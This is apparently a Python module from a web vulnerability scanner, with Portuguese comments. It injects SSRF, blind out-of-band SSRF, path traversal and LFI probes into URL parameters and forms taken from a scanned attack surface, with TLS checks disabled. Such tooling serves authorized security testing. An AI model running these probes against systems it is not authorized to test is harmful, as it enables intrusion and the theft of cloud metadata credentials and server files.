"""
runner.py — SSRFScanner
Testa SSRF (metadata cloud + loopback), blind SSRF (OOB opcional),
Path Traversal e LFI em parâmetros extraídos do attack_surface.json.
"""

from __future__ import annotations

import base64
import json
import ssl
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.error import HTTPError
from urllib.request import Request, urlopen

from . import payloads as P

HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; Buggy/1.0)", "Accept": "*/*"}
TIMEOUT = 10

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode    = ssl.CERT_NONE


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _get(url: str, timeout: int = TIMEOUT) -> tuple[int, str]:
    try:
        req  = Request(url, headers=HEADERS)
        resp = urlopen(req, timeout=timeout, context=SSL_CTX)
        body = resp.read(256 * 1024).decode("utf-8", errors="ignore")
        return resp.status, body
    except HTTPError as e:
        body = e.read(16 * 1024).decode("utf-8", errors="ignore") if e.fp else ""
        return e.code, body
    except Exception:
        return 0, ""


def _post_form(url: str, data: dict, timeout: int = TIMEOUT) -> tuple[int, str]:
    try:
        encoded = urllib.parse.urlencode(data).encode()
        req = Request(url, data=encoded, headers={
            **HEADERS, "Content-Type": "application/x-www-form-urlencoded"
        })
        resp = urlopen(req, timeout=timeout, context=SSL_CTX)
        return resp.status, resp.read(256 * 1024).decode("utf-8", errors="ignore")
    except HTTPError as e:
        body = e.read(16 * 1024).decode("utf-8", errors="ignore") if e.fp else ""
        return e.code, body
    except Exception:
        return 0, ""


def _inject_param(url: str, param: str, value: str) -> str:
    parsed = urllib.parse.urlparse(url)
    qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()


def _contains(body: str, markers: list[str]) -> str | None:
    bl = body.lower()
    for m in markers:
        if m.lower() in bl:
            return m
    return None


# ── SSRF ──────────────────────────────────────────────────────────────────────

def _test_ssrf(url: str, param: str) -> dict | None:
    for target in P.SSRF_TARGETS[:10]:
        injected = _inject_param(url, param, target)
        _, body  = _get(injected, timeout=8)
        hit = _contains(body, P.SSRF_MARKERS)
        if hit:
            return {
                "type":       "ssrf",
                "url":        injected,
                "parameter":  param,
                "payload":    target,
                "evidence":   f"Response contains '{hit}'",
                "confidence": "high",
            }
    return None


def _test_ssrf_form(form: dict) -> dict | None:
    url    = form.get("action", "") or form.get("url", "")
    fields = form.get("fields", []) or form.get("inputs", [])
    if not url:
        return None

    for f in fields:
        name = f if isinstance(f, str) else f.get("name", "")
        if not name or name.lower() not in P.SSRF_PARAMS:
            continue
        for target in P.SSRF_TARGETS[:8]:
            _, body = _post_form(url, {name: target})
            hit = _contains(body, P.SSRF_MARKERS)
            if hit:
                return {
                    "type":       "ssrf",
                    "url":        url,
                    "parameter":  name,
                    "payload":    target,
                    "evidence":   f"Response contains '{hit}'",
                    "confidence": "high",
                    "via":        "POST form",
                }
    return None


def _test_blind_ssrf(url: str, param: str, oob_host: str) -> dict | None:
    """Testa blind SSRF com callback OOB — só corre se oob_host fornecido."""
    if not oob_host:
        return None
    for payload in P.blind_ssrf_payloads(oob_host)[:3]:
        injected = _inject_param(url, param, payload)
        _get(injected, timeout=8)   # dispara — verificação é manual/OOB
    # Retorna finding com confiança low (não temos confirmação automática)
    return {
        "type":       "ssrf_blind",
        "url":        _inject_param(url, param, P.blind_ssrf_payloads(oob_host)[0]),
        "parameter":  param,
        "payload":    f"OOB callback to {oob_host}",
        "evidence":   f"Probe sent to {oob_host} — check DNS/HTTP logs",
        "confidence": "low",
    }


# ── Path Traversal ────────────────────────────────────────────────────────────

def _test_path_traversal(url: str, param: str) -> dict | None:
    for payload in P.PATH_PAYLOADS[:15]:
        injected = _inject_param(url, param, payload)
        _, body  = _get(injected, timeout=TIMEOUT)
        hit = _contains(body, P.TRAVERSAL_MARKERS)
        if hit:
            return {
                "type":       "path_traversal",
                "url":        injected,
                "parameter":  param,
                "payload":    payload,
                "evidence":   f"Response contains '{hit}'",
                "confidence": "high",
            }
    return None


# ── LFI ───────────────────────────────────────────────────────────────────────

def _test_lfi(url: str, param: str) -> dict | None:
    for payload in P.LFI_PAYLOADS[:12]:
        injected = _inject_param(url, param, payload)
        _, body  = _get(injected, timeout=TIMEOUT)

        # Detecta marcadores diretos
        hit = _contains(body, P.LFI_MARKERS)
        if hit:
            return {
                "type":       "lfi",
                "url":        injected,
                "parameter":  param,
                "payload":    payload,
                "evidence":   f"Response contains '{hit}'",
                "confidence": "high",
            }

        # Detecta base64 de PHP (php://filter)
        if "base64" in payload and len(body) > 20:
            try:
                decoded = base64.b64decode(body.strip()[:4096]).decode("utf-8", "ignore")
                if "<?php" in decoded or "root:x" in decoded:
                    return {
                        "type":       "lfi",
                        "url":        injected,
                        "parameter":  param,
                        "payload":    payload,
                        "evidence":   "Base64-encoded file content decoded successfully",
                        "confidence": "high",
                    }
            except Exception:
                pass

    return None


# ── Scanner principal ─────────────────────────────────────────────────────────

class SSRFScanner:
    def __init__(self, target: str, output_dir: str, oob_host: str = ""):
        self.target     = target
        self.output_dir = Path(output_dir)
        self.oob_host   = oob_host
        self.attack_dir = self.output_dir / "attacks" / "ssrf"
        self.attack_dir.mkdir(parents=True, exist_ok=True)
        self.findings: list[dict] = []

    def _load_surface(self) -> dict:
        p = self.output_dir / "surface" / "attack_surface.json"
        if p.exists():
            with open(p) as f:
                return json.load(f)
        return {}

    def _save(self):
        from modules.Report import score_bulk
        if self.findings:
            self.findings = score_bulk(self.findings)
        out = self.attack_dir / "findings.json"
        with open(out, "w") as f:
            json.dump(self.findings, f, indent=2)
        surface_file = self.output_dir / "surface" / "attack_surface.json"
        if surface_file.exists():
            with open(surface_file) as f:
                surface = json.load(f)
            surface.setdefault("ssrf_findings", []).extend(self.findings)
            with open(surface_file, "w") as f:
                json.dump(surface, f, indent=2)

    def _collect_targets(self, surface: dict) -> list[tuple[str, str, str]]:
        """Retorna (url, param, kind) para todas as combinações relevantes."""
        targets: list[tuple[str, str, str]] = []

        # Todos os endpoints com parâmetros
        all_endpoints = []
        for key in ["search_endpoints", "login_pages"]:
            all_endpoints += surface.get("injection_targets", {}).get(key, [])

        for ep in all_endpoints[:40]:
            url    = str(ep)
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query)

            for param in qs:
                pl = param.lower()
                if pl in P.SSRF_PARAMS:
                    targets.append((url, param, "ssrf"))
                    if self.oob_host:
                        targets.append((url, param, "blind_ssrf"))
                if pl in P.PATH_PARAMS:
                    targets.append((url, param, "traversal"))
                    targets.append((url, param, "lfi"))

            # Se não tem parâmetros, injeta os comuns
            if not qs:
                for param in ["file", "page", "url", "path", "include"]:
                    targets.append((url, param, "traversal"))
                    targets.append((url, param, "ssrf"))

        return targets[:120]

    def exec(self, threads: int = 20, timeout: float = 10.0, oob_host: str = ""):
        if oob_host:
            self.oob_host = oob_host

        print(f"\n{'='*60}")
        print(f"  SSRFScanner — {self.target}")
        if self.oob_host:
            print(f"  OOB host: {self.oob_host}")
        print(f"{'='*60}\n")

        surface = self._load_surface()
        if not surface:
            print("  ⚠️  attack_surface.json não encontrado — rode surface primeiro")
            return

        tasks = self._collect_targets(surface)

        # Forms com parâmetros SSRF
        forms = surface.get("injection_targets", {}).get("forms", [])
        form_tasks = [(f,) for f in forms[:20]]

        print(f"  [+] {len(tasks)} param tasks + {len(form_tasks)} form tasks\n")

        def _run_task(task: tuple) -> list[dict]:
            try:
                if len(task) == 3:
                    url, param, kind = task
                    if kind == "ssrf":
                        r = _test_ssrf(url, param)
                    elif kind == "blind_ssrf":
                        r = _test_blind_ssrf(url, param, self.oob_host)
                    elif kind == "traversal":
                        r = _test_path_traversal(url, param)
                    elif kind == "lfi":
                        r = _test_lfi(url, param)
                    else:
                        r = None
                    return [r] if r else []
                elif len(task) == 1:
                    r = _test_ssrf_form(task[0])
                    return [r] if r else []
            except Exception:
                pass
            return []

        all_tasks = tasks + form_tasks  # type: ignore
        with ThreadPoolExecutor(max_workers=min(threads, 25)) as ex:
            futures = [ex.submit(_run_task, t) for t in all_tasks]
            done = 0
            for fut in as_completed(futures):
                self.findings.extend(fut.result())
                done += 1
                if done % 20 == 0:
                    print(f"  ... {done}/{len(all_tasks)} tasks, {len(self.findings)} findings")

        self._save()

        print(f"\n{'='*60}")
        print(f"  ✅ SSRF scan complete — {len(self.findings)} findings")
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            count = sum(1 for f in self.findings if f.get("cvss_severity") == sev)
            if count:
                print(f"     {sev}: {count}")
        print(f"  📁 {self.attack_dir}/findings.json")
        print(f"{'='*60}")

        return self.findings
